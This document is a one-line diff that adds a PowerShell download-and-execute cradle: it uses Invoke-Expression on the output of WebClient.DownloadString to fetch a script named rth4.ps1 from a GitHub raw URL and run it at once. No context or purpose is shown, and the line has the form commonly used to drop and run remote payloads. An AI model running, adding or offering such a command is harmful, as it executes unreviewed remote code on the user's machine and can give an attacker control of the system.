@@ -1,0 +1,1 @@
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/srbhptl39/automation/master/rth4.ps1')
